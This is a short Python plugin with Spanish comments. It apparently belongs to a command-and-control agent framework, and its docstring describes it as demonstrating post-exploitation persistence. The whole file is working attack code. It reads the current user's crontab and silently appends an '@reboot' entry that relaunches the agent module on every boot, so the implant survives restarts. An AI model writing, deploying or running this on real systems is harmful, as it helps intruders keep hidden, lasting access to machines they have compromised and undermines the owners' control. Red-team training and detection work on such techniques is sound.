"""
Plugin !persist — instala el agente en el crontab del usuario actual.
Demuestra persistencia post-explotación.
"""

import os
import subprocess
import sys


def run(args: str) -> tuple[int, str, str]:
    agent_cmd = f"{sys.executable} -m agent"
    cron_line = f"@reboot {agent_cmd}\n"

    try:
        # Leer crontab actual
        result = subprocess.run(
            ["crontab", "-l"], capture_output=True, text=True, timeout=5
        )
        existing = result.stdout if result.returncode == 0 else ""

        if agent_cmd in existing:
            return 0, "Persistencia ya instalada en crontab.", ""

        new_crontab = existing + cron_line
        proc = subprocess.run(
            ["crontab", "-"],
            input=new_crontab, capture_output=True, text=True, timeout=5
        )
        if proc.returncode != 0:
            return 1, "", f"crontab error: {proc.stderr.strip()}"

        return 0, f"Persistencia instalada:\n  {cron_line.strip()}", ""

    except FileNotFoundError:
        return 1, "", "crontab no disponible en este sistema"
    except Exception as exc:
        return 1, "", str(exc)
